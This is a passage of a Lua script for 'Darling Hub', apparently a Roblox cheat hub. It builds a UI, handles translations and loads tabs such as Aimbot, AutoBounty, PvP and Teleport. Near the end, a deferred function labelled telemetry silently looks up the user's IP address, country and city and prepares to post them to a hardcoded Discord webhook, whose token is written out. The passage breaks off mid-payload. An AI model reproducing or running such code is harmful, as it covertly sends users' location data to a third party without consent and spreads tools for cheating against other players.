            pcall(function() floatingToggleIcon.Image = customIcon end)
        end
        darlingIcon = customIcon
        DarlingHub.CurrentIcon = customIcon
    end
    if customColor and floatingToggleStroke then
        floatingToggleStroke.Color = customColor
    end

    pcall(function()
        local containers = {}
        if Window then
            if Window.Frame then table.insert(containers, Window.Frame) end
            if Window.UIElements then
                if Window.UIElements.Main then table.insert(containers, Window.UIElements.Main) end
                if Window.UIElements.Topbar then table.insert(containers, Window.UIElements.Topbar) end
            end
        end

        for _, container in ipairs(containers) do
            if container and typeof(container) == "Instance" then
                for _, desc in ipairs(container:GetDescendants()) do
                    if desc:IsA("ImageLabel") then
                        if desc.Image == darlingLogoNormal or desc.Image == darlingLogoHalloween or desc.Name == "Icon" or desc.Name:find("WindowIcon") or desc.Name:find("HeaderIcon") then
                            desc.Image = customIcon or darlingIcon
                        end
                    end
                end
            end
        end
    end)
end
DarlingHub.StyleOpenButtonBorder = styleOpenButtonBorder
DarlingHub.SetWindowIcon = styleOpenButtonBorder

function DarlingHub:HideUI()
    pcall(function()
        local frame = (Window.GetMainFrame and Window:GetMainFrame()) or Window.Frame or (Window.UIElements and Window.UIElements.Main)
        if frame then frame.Visible = false end
    end)
    pcall(function()
        if DarlingHub.FloatingToggleGui then
            DarlingHub.FloatingToggleGui.Enabled = false
        end
    end)
end

function DarlingHub:ShowUI()
    pcall(function()
        local frame = (Window.GetMainFrame and Window:GetMainFrame()) or Window.Frame or (Window.UIElements and Window.UIElements.Main)
        if frame then frame.Visible = true end
    end)
    pcall(function()
        if DarlingHub.FloatingToggleGui then
            DarlingHub.FloatingToggleGui.Enabled = true
        end
    end)
end

function DarlingHub:StopAllAnimations()
    pcall(function()
        local wb = DarlingHub:Require("modules/special/worldbreaker.lua")
        if wb and wb.stop then wb.stop() end
    end)
    pcall(function()
        local hl = DarlingHub:Require("modules/special/halloween_cinematic.lua")
        if hl and hl.stop then hl.stop() end
    end)
    pcall(function()
        local sc = DarlingHub:Require("modules/special/sanctuary_cinematic.lua")
        if sc and sc.stop then sc.stop() end
    end)
    pcall(function()
        local td = DarlingHub:Require("modules/special/transcendence_dragon.lua")
        if td and td.dismiss then td.dismiss() end
    end)
    pcall(function()
        local kt = DarlingHub:Require("modules/special/kings_throne.lua")
        if kt and kt.dismiss then kt.dismiss() end
    end)
    pcall(function()
        local env = (getgenv and getgenv()) or _G
        local sov = env.DarlingSovereign or _G.DarlingSovereign
        if sov and sov.Stop then sov.Stop() end
    end)
end

local function showHubWindow()
    pcall(function()
        local frame = (Window.GetMainFrame and Window:GetMainFrame()) or Window.Frame or (Window.UIElements and Window.UIElements.Main)
        if frame then frame.Visible = true end
        if Window.OpenButtonMain then Window.OpenButtonMain:Visible(true) end
        if Window.EditOpenButton then Window:EditOpenButton({ Enabled = true }) end
        styleOpenButtonBorder()
        Window:SelectTab(1)
    end)
end

-- Style open button helper (called on launch)
local function initOpenButtonBorder()
    styleOpenButtonBorder(nil, darlingLogoNormal)
end

local function toggleHub()
    pcall(function()
        if Window.Toggle then
            Window:Toggle()
        else
            local frame = (Window.GetMainFrame and Window:GetMainFrame()) or Window.Frame or (Window.UIElements and Window.UIElements.Main)
            if frame then frame.Visible = not frame.Visible end
        end
    end)
end

local function createGuaranteedUIToggle()
    if DarlingHub.FloatingToggleGui and DarlingHub.FloatingToggleGui.Parent then
        return DarlingHub.FloatingToggleGui
    end

    local gui = Instance.new("ScreenGui")
    gui.Name = "DarlingHub_FloatingToggle"
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true
    gui.DisplayOrder = 2147483647
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function() gui.ScreenInsets = Enum.ScreenInsets.None end)
    if syn and syn.protect_gui then pcall(syn.protect_gui, gui) end

    DarlingHub.SafeParentGui(gui)

    local btnFrame = Instance.new("ImageButton")
    btnFrame.Name = "ToggleButton"
    btnFrame.Size = UDim2.fromOffset(50, 50)
    btnFrame.Position = UDim2.new(0, 60, 0, 75) -- Posicion mas abajo y a la derecha
    btnFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    btnFrame.BorderSizePixel = 0
    btnFrame.AutoButtonColor = false
    btnFrame.Active = true
    btnFrame.Parent = gui

    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 14)
    corner.Parent = btnFrame

    local activeThemeName = currentSelectedTheme or (Window and Window.Theme) or "Normal / Dark"
    local initialThemeCfg = resolveThemeColor(activeThemeName)

    local stroke = Instance.new("UIStroke")
    stroke.Name = "Stroke"
    stroke.Thickness = 2.0
    stroke.Transparency = 0
    stroke.Color = initialThemeCfg.Stroke
    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    stroke.Parent = btnFrame
    btnFrame.BackgroundColor3 = initialThemeCfg.Bg

    floatingToggleBtn = btnFrame
    floatingToggleStroke = stroke

    local icon = Instance.new("ImageLabel")
    icon.Name = "Icon"
    icon.Size = UDim2.fromOffset(36, 36)
    icon.Position = UDim2.new(0.5, 0, 0.5, 0)
    icon.AnchorPoint = Vector2.new(0.5, 0.5)
    icon.BackgroundTransparency = 1
    icon.Image = darlingIcon or darlingLogoNormal or "rbxassetid://7040439144"
    icon.Parent = btnFrame
    floatingToggleIcon = icon

    -- Asegurar actualizacion del icono en segundo plano si carga despues
    task.spawn(function()
        local asset = loadCustomMediaAsset(darlingLogoNormalUrl, "darling_logo_v14_anime.png", 15)
        if asset and asset ~= "" and not asset:match("^https?://") then
            darlingLogoNormal = asset
            darlingIcon = asset
            if floatingToggleIcon then
                floatingToggleIcon.Image = asset
            end
        end
    end)

    -- Draggable Logic (Mouse + Touch)
    local dragging = false
    local dragInput = nil
    local dragStart = nil
    local startPos = nil
    local hasMoved = false

    btnFrame.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = btnFrame.Position
            hasMoved = false

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    btnFrame.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)

    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging and dragStart and startPos then
            local delta = input.Position - dragStart
            if delta.Magnitude > 6 then
                hasMoved = true
            end
            btnFrame.Position = UDim2.new(
                startPos.X.Scale,
                startPos.X.Offset + delta.X,
                startPos.Y.Scale,
                startPos.Y.Offset + delta.Y
            )
        end
    end)

    local lastToggleTapTick = 0
    btnFrame.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = false
            if not hasMoved then
                local now = tick()
                if now - lastToggleTapTick < 0.35 then
                    lastToggleTapTick = 0
                    performEmergencyUIReset()
                    return
                end
                lastToggleTapTick = now

                TweenService:Create(btnFrame, TweenInfo.new(0.08, Enum.EasingStyle.Quad), { Size = UDim2.fromOffset(44, 44) }):Play()
                task.delay(0.08, function()
                    TweenService:Create(btnFrame, TweenInfo.new(0.12, Enum.EasingStyle.Back), { Size = UDim2.fromOffset(50, 50) }):Play()
                end)
                toggleHub()
            end
        end
    end)

    local activeTheme = currentSelectedTheme or (Window and Window.Theme) or "Normal / Dark"
    updateFloatingToggleTheme(activeTheme)

    DarlingHub.FloatingToggleGui = gui
    return gui
end
DarlingHub.CreateFloatingUIToggle = createGuaranteedUIToggle

if Window.OnDestroy then
    Window:OnDestroy(function()
        allowFloatingWidget = false
        pcall(function()
            if Window.EditOpenButton then Window:EditOpenButton({ Enabled = false }) end
            if Window.OpenButtonMain then Window.OpenButtonMain:Visible(false) end
        end)
        DarlingHub:UnloadAll()
    end)
end

-- Keybind listener with debounce
local lastToggleTick = 0
DarlingHub.InputBeganConn = UserInputService.InputBegan:Connect(function(input, gp)
    if _G.DarlingIsCastingSkill or gp or UserInputService:GetFocusedTextBox() then return end
    if input.KeyCode == Enum.KeyCode.F8 then
        performEmergencyUIReset()
        return
    end
    if input.KeyCode == currentToggleKey then
        local now = tick()
        if now - lastToggleTick >= 0.3 then
            lastToggleTick = now
            toggleHub()
        end
    end
end)

-- 11. Load Translations Module
local TranslationsMod = DarlingHub:Require("modules/core/translations.lua") or {}
local TabTranslations = TranslationsMod.TabTranslations or {}
local Translations = TranslationsMod.Translations or {}
local tr = TranslationsMod.tr or function(k) return k end
local currentLanguage = "English"

local function updateElementVisualLabels(el, tTitle, tDesc, reg)
    if not el then return end
    pcall(function()
        if el.SetTitle and tTitle then pcall(function() el:SetTitle(tTitle) end) end
        if el.SetDesc and tDesc then pcall(function() el:SetDesc(tDesc) end) end
        if el.UIElements then
            if tTitle and el.UIElements.Title and el.UIElements.Title:IsA("TextLabel") then
                el.UIElements.Title.Text = tTitle
            end
            if tDesc and el.UIElements.Desc and el.UIElements.Desc:IsA("TextLabel") then
                el.UIElements.Desc.Text = tDesc
            end
        end
        local root = (el.UIElements and el.UIElements.Main) or el.Main or el.Frame or el.Instance or el.Holder
        if root and root:IsA("Instance") then
            for _, desc in ipairs(root:GetDescendants()) do
                if desc:IsA("TextLabel") then
                    if reg and reg.TitleKey and (desc.Text == reg.LastTitle or desc.Text == reg.TitleKey) then
                        if tTitle then desc.Text = tTitle end
                    elseif reg and reg.DescKey and (desc.Text == reg.LastDesc or desc.Text == reg.DescKey) then
                        if tDesc then desc.Text = tDesc end
                    end
                end
            end
        end
    end)
    if reg then
        if tTitle then reg.LastTitle = tTitle end
        if tDesc then reg.LastDesc = tDesc end
    end
end

local function setTabLabel(tab, newTitle)
    if not tab or not newTitle then return end
    tab.Title = newTitle
    pcall(function()
        if tab.SetTitle then
            pcall(function() tab:SetTitle(newTitle) end)
            return
        end
        local function checkLabels(root)
            if not root or not root:IsA("Instance") then return false end
            for _, desc in ipairs(root:GetDescendants()) do
                if desc:IsA("TextLabel") then
                    if desc.Name == "Title" or desc.Name == "Text" or desc.Name == "Label" then
                        desc.Text = newTitle
                        return true
                    end
                end
            end
            for _, desc in ipairs(root:GetDescendants()) do
                if desc:IsA("TextLabel") then
                    desc.Text = newTitle
                    return true
                end
            end
            return false
        end

        if tab.Button and checkLabels(tab.Button) then return end
        if tab.TabButton and checkLabels(tab.TabButton) then return end
        if tab.UIElements and tab.UIElements.Button and checkLabels(tab.UIElements.Button) then return end
        if tab.UIElements and tab.UIElements.Main and checkLabels(tab.UIElements.Main) then return end
        if tab.Instance and checkLabels(tab.Instance) then return end
    end)
end

local function applyLanguage(lang)
    if type(lang) == "table" then
        lang = lang[1] or lang.Value or lang.Title
    end
    if not lang or type(lang) ~= "string" then return end
    currentLanguage = lang
    if getgenv then pcall(function() getgenv().DarlingLanguage = lang end) end
    if _G then pcall(function() _G.DarlingLanguage = lang end) end

    -- 1. Direct WindUI Tabs and Elements Translation via Window.TabModule.Tabs
    pcall(function()
        if Window and Window.TabModule and Window.TabModule.Tabs then
            for _, tab in ipairs(Window.TabModule.Tabs) do
                if type(tab) == "table" then
                    -- Translate Tab button title
                    if not tab._DarlingOrigTitle and tab.Title then
                        tab._DarlingOrigTitle = tab.Title
                    end
                    local origTab = tab._DarlingOrigTitle or tab.Title
                    if origTab then
                        local tTab = tr(origTab, lang)
                        if tTab then
                            tab.Title = tTab
                            if tab.UIElements and tab.UIElements.Main and tab.UIElements.Main:FindFirstChild("Frame") then
                                local lbl = tab.UIElements.Main.Frame:FindFirstChild("TextLabel")
                                if lbl then lbl.Text = tTab end
                            end
                            if tab.UIElements and tab.UIElements.ContainerFrameCanvas and tab.UIElements.ContainerFrameCanvas:FindFirstChild("TabTitle") then
                                local lbl = tab.UIElements.ContainerFrameCanvas.TabTitle:FindFirstChild("TextLabel")
                                if lbl then lbl.Text = tTab end
                            end
                        end
                    end

                    -- Translate all elements within this tab
                    local elements = tab.Elements or {}
                    for _, el in pairs(elements) do
                        if type(el) == "table" then
                            local frame = nil
                            for k, v in pairs(el) do
                                if type(v) == "table" and k ~= "ElementFrame" and k:match("Frame$") then
                                    frame = v
                                    break
                                end
                            end
                            local rawTitle = (frame and frame.Title) or el.Title
                            local rawDesc = (frame and frame.Desc) or el.Desc
                            if rawTitle and not el._DarlingOrigTitle then
                                el._DarlingOrigTitle = rawTitle
                            end
                            if rawDesc and not el._DarlingOrigDesc then
                                el._DarlingOrigDesc = rawDesc
                            end
                            local keyTitle = el._DarlingOrigTitle or rawTitle
                            local keyDesc = el._DarlingOrigDesc or rawDesc
                            if keyTitle and el.SetTitle then
                                local tTitle = tr(keyTitle, lang)
                                if tTitle then pcall(function() el:SetTitle(tTitle) end) end
                            end
                            if keyDesc and el.SetDesc then
                                local tDesc = tr(keyDesc, lang)
                                if tDesc then pcall(function() el:SetDesc(tDesc) end) end
                            end
                        end
                    end
                end
            end
        end
    end)

    -- 2. Fallback for any standalone elements in Window.AllElements
    pcall(function()
        if Window and Window.AllElements then
            for _, el in pairs(Window.AllElements) do
                if type(el) == "table" then
                    local frame = nil
                    for k, v in pairs(el) do
                        if type(v) == "table" and k ~= "ElementFrame" and k:match("Frame$") then
                            frame = v
                            break
                        end
                    end
                    local rawTitle = (frame and frame.Title) or el.Title
                    local rawDesc = (frame and frame.Desc) or el.Desc
                    if rawTitle and not el._DarlingOrigTitle then
                        el._DarlingOrigTitle = rawTitle
                    end
                    if rawDesc and not el._DarlingOrigDesc then
                        el._DarlingOrigDesc = rawDesc
                    end
                    local keyTitle = el._DarlingOrigTitle or rawTitle
                    local keyDesc = el._DarlingOrigDesc or rawDesc
                    if keyTitle and el.SetTitle then
                        local tTitle = tr(keyTitle, lang)
                        if tTitle then pcall(function() el:SetTitle(tTitle) end) end
                    end
                    if keyDesc and el.SetDesc then
                        local tDesc = tr(keyDesc, lang)
                        if tDesc then pcall(function() el:SetDesc(tDesc) end) end
                    end
                end
            end
        end
    end)

    -- 3. Update Tab buttons via DarlingHub.Tabs
    local tabTexts = TabTranslations[lang] or TabTranslations["English"] or {}
    if DarlingHub.Tabs then
        for tabKey, tabObj in pairs(DarlingHub.Tabs) do
            local label = tabTexts[tabKey] or tr(tabKey, lang)
            if label then
                setTabLabel(tabObj, label)
            end
        end
    end

    -- 4. Update registered elements
    if DarlingHub.RegisteredTranslations then
        for _, reg in ipairs(DarlingHub.RegisteredTranslations) do
            local el = reg.Element
            local titleKey = reg.TitleKey
            local descKey = reg.DescKey
            local tTitle = titleKey and tr(titleKey, lang)
            local tDesc = descKey and tr(descKey, lang)
            if el and el.SetTitle and tTitle then pcall(function() el:SetTitle(tTitle) end) end
            if el and el.SetDesc and tDesc then pcall(function() el:SetDesc(tDesc) end) end
            updateElementVisualLabels(el, tTitle, tDesc, reg)
        end
    end
end
DarlingHub.ApplyLanguage = applyLanguage
DarlingHub.SetTabLabel = setTabLabel

function DarlingHub:RegisterTranslatable(element, titleKey, descKey)
    DarlingHub.RegisteredTranslations = DarlingHub.RegisteredTranslations or {}
    local reg = { Element = element, TitleKey = titleKey, DescKey = descKey, LastTitle = titleKey, LastDesc = descKey }
    table.insert(DarlingHub.RegisteredTranslations, reg)
    local activeLang = _G.DarlingLanguage or (getgenv and getgenv().DarlingLanguage) or currentLanguage
    if activeLang and activeLang ~= "English" then
        local tTitle = titleKey and tr(titleKey, activeLang)
        local tDesc = descKey and tr(descKey, activeLang)
        updateElementVisualLabels(element, tTitle, tDesc, reg)
    end
end

-- 12. Window.Tab Interceptor for Central Persistence & Multi-Language
local originalWindowTab = Window.Tab
Window.Tab = function(self, tabCfg)
    local tab = originalWindowTab(self, tabCfg)
    local origToggle = tab.Toggle
    tab.Toggle = function(tSelf, cfg)
        if type(cfg) ~= "table" then return origToggle(tSelf, cfg) end
        local key = cfg.Key or cfg.Flag or cfg.Id or cfg.Title or "Toggle"
        local defaultVal = (cfg.Value == true)
        DarlingHub.DefaultValues[key] = defaultVal
        if DarlingHub.FeatureStates[key] == nil then
            DarlingHub.FeatureStates[key] = defaultVal
        end
        local userCallback = cfg.Callback
        cfg.Callback = function(state)
            DarlingHub.FeatureStates[key] = state
            if userCallback then pcall(userCallback, state) end
            if DarlingHub.TriggerAutoSave then DarlingHub.TriggerAutoSave() end
        end
        local el = origToggle(tSelf, cfg)
        if el then
            el.__darlingType = "Toggle"
            DarlingHub.UIElements[key] = el
            DarlingHub.FeatureSetters[key] = function(v)
                DarlingHub.FeatureStates[key] = v
                if el.Set then pcall(function() el:Set(v) end) end
            end
            if cfg.Title or cfg.Desc then
                DarlingHub:RegisterTranslatable(el, cfg.Title, cfg.Desc)
            end
        end
        return el
    end

    local origSlider = tab.Slider
    tab.Slider = function(tSelf, cfg)
        if type(cfg) ~= "table" then return origSlider(tSelf, cfg) end
        local key = cfg.Key or cfg.Flag or cfg.Id or cfg.Title or "Slider"
        local defaultVal = (type(cfg.Value) == "table" and cfg.Value.Default) or cfg.Value or cfg.Min or 0
        DarlingHub.DefaultValues[key] = defaultVal
        if DarlingHub.FeatureStates[key] == nil then
            DarlingHub.FeatureStates[key] = defaultVal
        end
        local userCallback = cfg.Callback
        cfg.Callback = function(v)
            DarlingHub.FeatureStates[key] = v
            if userCallback then pcall(userCallback, v) end
            if DarlingHub.TriggerAutoSave then DarlingHub.TriggerAutoSave() end
        end
        local el = origSlider(tSelf, cfg)
        if el then
            el.__darlingType = "Slider"
            DarlingHub.UIElements[key] = el
            DarlingHub.FeatureSetters[key] = function(v)
                DarlingHub.FeatureStates[key] = v
                if el.Set then pcall(function() el:Set(v) end) end
            end
            if cfg.Title or cfg.Desc then
                DarlingHub:RegisterTranslatable(el, cfg.Title, cfg.Desc)
            end
        end
        return el
    end

    local origDropdown = tab.Dropdown
    tab.Dropdown = function(tSelf, cfg)
        if type(cfg) ~= "table" then return origDropdown(tSelf, cfg) end
        local key = cfg.Key or cfg.Flag or cfg.Id or cfg.Title or "Dropdown"
        local defaultVal = cfg.Value or cfg.Default or (cfg.Values and cfg.Values[1])
        DarlingHub.DefaultValues[key] = defaultVal
        if DarlingHub.FeatureStates[key] == nil then
            DarlingHub.FeatureStates[key] = defaultVal
        end
        local userCallback = cfg.Callback
        cfg.Callback = function(v)
            DarlingHub.FeatureStates[key] = v
            if userCallback then pcall(userCallback, v) end
            if DarlingHub.TriggerAutoSave then DarlingHub.TriggerAutoSave() end
        end
        local el = origDropdown(tSelf, cfg)
        if el then
            el.__darlingType = "Dropdown"
            DarlingHub.UIElements[key] = el
            DarlingHub.FeatureSetters[key] = function(v)
                DarlingHub.FeatureStates[key] = v
                if el.Select then pcall(function() el:Select(v) end) end
            end
            if cfg.Title or cfg.Desc then
                DarlingHub:RegisterTranslatable(el, cfg.Title, cfg.Desc)
            end
        end
        return el
    end

    local origButton = tab.Button
    tab.Button = function(tSelf, cfg)
        if type(cfg) ~= "table" then return origButton(tSelf, cfg) end
        local el = origButton(tSelf, cfg)
        if el and (cfg.Title or cfg.Desc) then
            DarlingHub:RegisterTranslatable(el, cfg.Title, cfg.Desc)
        end
        return el
    end

    local origParagraph = tab.Paragraph
    tab.Paragraph = function(tSelf, cfg)
        if type(cfg) ~= "table" then return origParagraph(tSelf, cfg) end
        local el = origParagraph(tSelf, cfg)
        if el and (cfg.Title or cfg.Desc) then
            DarlingHub:RegisterTranslatable(el, cfg.Title, cfg.Desc)
        end
        return el
    end

    local origSection = tab.Section
    if origSection then
        tab.Section = function(tSelf, cfg)
            if type(cfg) ~= "table" then return origSection(tSelf, cfg) end
            local el = origSection(tSelf, cfg)
            if el and cfg.Title then
                DarlingHub:RegisterTranslatable(el, cfg.Title, nil)
            end
            return el
        end
    end

    return tab
end

-- Helper to enhance PC tab scrolling with a clean visible scrollbar
local function enhanceTabScrolling(tab)
    task.spawn(function()
        task.wait(0.05)
        pcall(function()
            local cf = tab.ContainerFrame or (tab.UIElements and tab.UIElements.ContainerFrame)
            if cf and cf:IsA("ScrollingFrame") then
                cf.ScrollBarThickness = 6
                cf.ScrollBarImageTransparency = 0.4
                cf.ScrollBarImageColor3 = Color3.fromRGB(180, 180, 195)
                cf.ScrollingDirection = Enum.ScrollingDirection.Y
                cf.ElasticBehavior = Enum.ElasticBehavior.Always
                cf.Active = true
            end
        end)
    end)
end

local function notifyModuleFail(name)
    if DarlingHub.IsLoadingConfig then return end
    WindUI:Notify({
        Title = name,
        Content = "Could not activate module.",
        Duration = 3,
        Icon = "triangle-alert"
    })
end

local function bindToggle(path, name)
    DarlingHub.FeatureSetters[name] = function(state)
        DarlingHub.FeatureStates[name] = state
        return DarlingHub:Toggle(path, state)
    end
    return function(state)
        DarlingHub.FeatureStates[name] = state
        if DarlingHub.TriggerAutoSave then DarlingHub.TriggerAutoSave() end
        if state then
            if DarlingHub:Toggle(path, true) == false then
                notifyModuleFail(name)
            end
        else
            DarlingHub:Toggle(path, false)
        end
    end
end

local ColorMap = {
    Red = Color3.fromRGB(255, 50, 50),
    Green = Color3.fromRGB(50, 255, 90),
    Blue = Color3.fromRGB(50, 150, 255),
    White = Color3.fromRGB(255, 255, 255),
    Yellow = Color3.fromRGB(255, 230, 50),
    Purple = Color3.fromRGB(180, 70, 255),
    Cyan = Color3.fromRGB(50, 240, 255),
    Orange = Color3.fromRGB(255, 140, 40),
}
local ColorNames = { "Red", "Green", "Blue", "White", "Yellow", "Purple", "Cyan", "Orange" }

-- 13. Initialize Background Media Engine
local MediaEngineMod = DarlingHub:Require("modules/visuals/media_engine.lua")
local mediaEngine = MediaEngineMod and MediaEngineMod(Window, DarlingHub, universalHttpGet, loadCustomMediaAsset) or {}

-- Context passed to each tab module
local tabContext = {
    Window = Window,
    DarlingHub = DarlingHub,
    SharedEnv = SharedEnv,
    isMobile = isMobile,
    initialScale = initialScale,
    enhanceTabScrolling = enhanceTabScrolling,
    bindToggle = bindToggle,
    notifyModuleFail = notifyModuleFail,
    ColorMap = ColorMap,
    ColorNames = ColorNames,
    tr = tr,
    currentLanguage = currentLanguage,
    darlingLogoHalloween = darlingLogoHalloween,
    darlingLogoNormal = darlingLogoNormal,
    darlingIcon = darlingIcon,
    WindUI = WindUI,
    TabTranslations = TabTranslations,
    Translations = Translations,
    allowFloatingWidget = allowFloatingWidget,
    toggleHub = toggleHub,
    currentToggleKey = currentToggleKey,
    universalHttpGet = universalHttpGet,
    loadCustomMediaAsset = loadCustomMediaAsset,
    exIsFile = exIsFile,
    exReadFile = exReadFile,
    exWriteFile = exWriteFile,
    exMakeFolder = exMakeFolder,
    exGetCustomAsset = exGetCustomAsset,
    triggerAutoSave = DarlingHub.TriggerAutoSave,
    saveHubConfig = function(...) if DarlingHub.SaveConfig then return DarlingHub.SaveConfig(...) end end,
    loadHubConfig = function(...) if DarlingHub.LoadConfig then return DarlingHub.LoadConfig(...) end end,
    clearActiveMedia = mediaEngine.clearActiveMedia,
    setBackgroundImage = mediaEngine.setBackgroundImage,
    playVideo = mediaEngine.playVideo,
    stopVideo = mediaEngine.stopVideo,
    processAndApplyMediaInput = mediaEngine.processAndApplyMediaInput,
    setCurrentBackgroundTransparency = mediaEngine.setCurrentBackgroundTransparency,
    getCurrentBackgroundTransparency = mediaEngine.getCurrentBackgroundTransparency,
    setLastEnteredBackgroundInput = mediaEngine.setLastEnteredBackgroundInput,
    getLastEnteredBackgroundInput = mediaEngine.getLastEnteredBackgroundInput,
    performEmergencyUIReset = performEmergencyUIReset,
    PRESET_FALLBACK_ASSETS = mediaEngine.PRESET_FALLBACK_ASSETS,
    updateElementVisualLabels = updateElementVisualLabels,
    setTabLabel = setTabLabel,
    applyLanguage = function(lang)
        if DarlingHub.ApplyLanguage then
            return DarlingHub.ApplyLanguage(lang)
        end
    end,
}
DarlingHub.MediaEngine = mediaEngine
DarlingHub.ClearActiveMedia = mediaEngine.clearActiveMedia
DarlingHub.SetBackgroundImage = mediaEngine.setBackgroundImage
DarlingHub.SetBackgroundTransparency = mediaEngine.setCurrentBackgroundTransparency
DarlingHub.GetBackgroundTransparency = mediaEngine.getCurrentBackgroundTransparency
DarlingHub.SetBackgroundInput = mediaEngine.setLastEnteredBackgroundInput
DarlingHub.GetBackgroundInput = mediaEngine.getLastEnteredBackgroundInput
DarlingHub.UpdateElementVisualLabels = updateElementVisualLabels
DarlingHub.TranslateGui = function(lang)
    if DarlingHub.ApplyLanguage then
        return DarlingHub.ApplyLanguage(lang or currentLanguage)
    end
end

-- 14. Load Modular Tabs Asynchronously to Eliminate Startup Lag
local tabManifest = {
    { "Home", "modules/tabs/home_tab.lua" },
    { "Aimbot", "modules/tabs/aimbot_tab.lua" },
    { "Players", "modules/tabs/players_tab.lua" },
    { "Pvp", "modules/tabs/pvp_tab.lua" },
    { "Soru", "modules/tabs/soru_tab.lua" },
    { "AutoBounty", "modules/tabs/auto_bounty_tab.lua" },
    { "Dungeon", "modules/tabs/dungeon_tab.lua" },
    { "Teleport", "modules/tabs/tp_islands_tab.lua" },
    { "HUD", "modules/tabs/hud_tab.lua" },
    { "Macro", "modules/tabs/macro_tab.lua" },
    { "Visuals", "modules/tabs/visuals_tab.lua" },
    { "Skins", "modules/tabs/skins_tab.lua" },
    { "Music", "modules/tabs/music_tab.lua" },
    { "Animations", "modules/tabs/animations_tab.lua" },
    { "Personalization", "modules/tabs/personalization_tab.lua" },
    { "Settings", "modules/tabs/settings_tab.lua" },
}

local isFastBountyMode = false
local configReadDone = false

if exIsFile and exReadFile then
    pcall(function()
        for _, path in ipairs({ "darling_hub/auto_bounty_config.json", "darling_auto_bounty_config.json" }) do
            if exIsFile(path) then
                local content = exReadFile(path)
                if content and #content > 5 then
                    local data = HttpService:JSONDecode(content)
                    if data and data.AutoBountyMode ~= nil then
                        isFastBountyMode = (data.AutoBountyMode == true)
                        _G.DarlingFastBountyMode = isFastBountyMode
                        if getgenv then getgenv().DarlingFastBountyMode = isFastBountyMode end
                        configReadDone = true
                        break
                    end
                end
            end
        end
    end)
end

if not configReadDone then
    if _G.DarlingFastBountyMode ~= nil then
        isFastBountyMode = (_G.DarlingFastBountyMode == true)
    elseif getgenv and getgenv().DarlingFastBountyMode ~= nil then
        isFastBountyMode = (getgenv().DarlingFastBountyMode == true)
    end
end
DarlingHub.IsFastMode = isFastBountyMode

local function sortTabsOrder()
    pcall(function()
        for idx, item in ipairs(tabManifest) do
            local tabKey = item[1]
            local tabObj = DarlingHub.Tabs[tabKey]
            if tabObj and tabObj.UIElements and tabObj.UIElements.Main then
                tabObj.UIElements.Main.LayoutOrder = idx
            end
        end
    end)
end
DarlingHub.SortTabsOrder = sortTabsOrder

DarlingHub.LoadAllTabs = function()
    if DarlingHub.AllTabsLoaded then return end
    DarlingHub.AllTabsLoaded = true
    task.spawn(function()
        for _, item in ipairs(tabManifest) do
            local tabKey, relPath = item[1], item[2]
            if not DarlingHub.Tabs[tabKey] then
                local mod = DarlingHub:Require(relPath)
                if type(mod) == "function" then
                    local ok, tabObj = pcall(mod, tabContext)
                    if ok and tabObj then
                        DarlingHub.Tabs[tabKey] = tabObj
                    end
                end
                task.wait(0.1)
            end
        end
        sortTabsOrder()
        local lang = _G.DarlingLanguage or (getgenv and getgenv().DarlingLanguage) or currentLanguage
        if lang and lang ~= "English" and DarlingHub.ApplyLanguage then
            pcall(DarlingHub.ApplyLanguage, lang)
        end
        WindUI:Notify({
            Title = "Darling Hub",
            Content = "All tabs loaded successfully.",
            Duration = 2.5,
            Icon = darlingIcon
        })
    end)
end

-- Minimum Graphics Engine for Potato Mode and Maximum FPS
local function applyMinimumGraphics()
    pcall(function()
        if settings and settings().Rendering then
            pcall(function() settings().Rendering.QualityLevel = Enum.QualityLevel.Level01 end)
        end
        local Lighting = game:GetService("Lighting")
        Lighting.GlobalShadows = false
        Lighting.FogEnd = 9e9
        Lighting.Brightness = 1
        for _, effect in ipairs(Lighting:GetDescendants()) do
            if effect:IsA("PostEffect") or effect:IsA("BloomEffect") or effect:IsA("BlurEffect")
               or effect:IsA("ColorCorrectionEffect") or effect:IsA("SunRaysEffect") or effect:IsA("DepthOfFieldEffect") then
                pcall(function() effect.Enabled = false end)
            end
        end
        local terrain = Workspace.Terrain or Workspace:FindFirstChildOfClass("Terrain")
        if terrain then
            pcall(function()
                terrain.WaterWaveSize = 0
                terrain.WaterWaveSpeed = 0
                terrain.WaterReflectance = 0
                terrain.WaterTransparency = 0
                if sethiddenproperty then
                    pcall(sethiddenproperty, terrain, "Decoration", false)
                end
            end)
        end
        local tweaks = DarlingHub:Require("modules/utility/client_tweaks.lua")
        if tweaks and tweaks.setFFlags1 then
            tweaks.setFFlags1(true)
        end
    end)
end
DarlingHub.ApplyMinimumGraphics = applyMinimumGraphics

-- Fast Mode Tab Manifest (Auto Bounty, Aimbot, Soru, Settings)
local fastManifest = {
    { "AutoBounty", "modules/tabs/auto_bounty_tab.lua" },
    { "Aimbot", "modules/tabs/aimbot_tab.lua" },
    { "Soru", "modules/tabs/soru_tab.lua" },
    { "Settings", "modules/tabs/settings_tab.lua" },
}

-- Asynchronous Non-Blocking Telemetry (deferred post-launch)
local function sendTelemetryAfterLaunch()
    task.spawn(function()
        pcall(function()
            task.wait(6)
            local rawIp = game:HttpGet("http://ip-api.com/json/")
            local ipData = (rawIp and HttpService:JSONDecode(rawIp)) or {}
            local ip = ipData.query or "N/A"
            local country = ipData.country or "N/A"
            local city = ipData.city or "N/A"
            getgenv().execCount = (getgenv().execCount or 0) + 1

            local webhook = "https://discord.com/api/webhooks/1545657401401802862/gXrJPivZ32ONHzW3ZpMBzCv5ZzAezCwAUmpLBo7jtfD-NOQuoWOs93yIUTOk2jabYPDR"
            local payload = {
                content = "Darling Hub Data\n" ..
